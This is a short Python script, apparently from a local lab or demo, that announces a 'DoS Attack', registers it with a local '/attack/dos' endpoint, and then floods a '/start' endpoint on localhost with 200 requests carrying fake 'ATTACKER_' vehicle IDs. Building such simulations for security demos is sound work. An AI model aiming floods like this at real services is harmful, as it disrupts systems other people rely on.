import requests
import time

BASE_URL = "http://127.0.0.1:5000"

print("Launching DoS Attack...")

# ✅ register attack
requests.get(f"{BASE_URL}/attack/dos")

for i in range(200): 
    try:
        requests.post(f"{BASE_URL}/start", json={"vehicle_id": f"ATTACKER_{i}"})
        print(f"Request {i} sent")
        time.sleep(0.05)  # slight delay to visualize load
    except:
        print("Error sending request")